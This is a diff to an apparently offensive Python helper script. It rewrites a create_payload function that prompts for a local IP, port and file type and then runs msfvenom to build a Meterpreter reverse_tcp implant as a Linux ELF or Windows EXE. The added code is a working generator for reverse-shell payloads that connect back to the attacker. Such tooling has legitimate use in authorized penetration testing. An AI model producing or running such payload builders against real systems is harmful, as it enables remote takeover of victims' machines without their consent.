@@ -182,7 +182,7 @@ def main():
     create_payload()
     print("")
     '''
-    
+    '''
     # function to allow the user to create a meterpreter payload
     def create_payload():
      answer = input("Before you start Metasploit if you are not sure what type of payload you are looking for \n we would suggest Meterpreter, which is a well known payload to create a reverse shell. \n Do you want to create a meterpreter payload? (y/n)")
@@ -206,6 +206,36 @@ def main():
 
     create_payload()
     print("")
+    '''
+    
+    # function to allow the user to create a meterpreter payload
+    def create_payload():
+        answer = input("Before you start Metasploit if you are not sure what type of payload you are looking for \n we would suggest Meterpreter, which is a well known payload to create a reverse shell. \n Do you want to create a meterpreter payload? (y/n)")
+        if answer == "y":
+           output = input("Enter a name for the output file: ")
+           lHost = input("Input local IP: ")
+           lPort = input("Choose target port: ")
+           output_type = input("Enter the output file type (ELF or EXE): ")
+           while output_type.lower() not in ['elf', 'exe']:
+               output_type = input("Invalid output file type. Enter the output file type (ELF or EXE): ")
+           path = input("Enter the output directory path (leave blank for current directory): ")
+           if path == "":
+              path = os.getcwd()
+           output_file = os.path.join(path, output)
+           for i in range(40):
+              time.sleep(0.25)
+              print("Creating Payload!" + spinner[i % len(spinner)], end="\r")
+           if output_type.lower() == 'elf':
+             subprocess.run(['msfvenom', '-p', 'linux/x86/meterpreter/reverse_tcp', 'LHOST=' + lHost, 'LPORT=' + lPort, '-f', 'elf', '-o', output_file])
+           else:
+            subprocess.run(['msfvenom', '-p', 'windows/meterpreter/reverse_tcp', 'LHOST=' + lHost, 'LPORT=' + lPort, '-f', 'exe', '-o', output_file])
+        elif answer == "n":
+           print("Payload not created.")
+        else:
+           print("Invalid input.")
+        print("")
+    
+    create_payload()
 
     def start_metasploit():
         answer = input("Do you want to start Metasploit? (y/n) ")
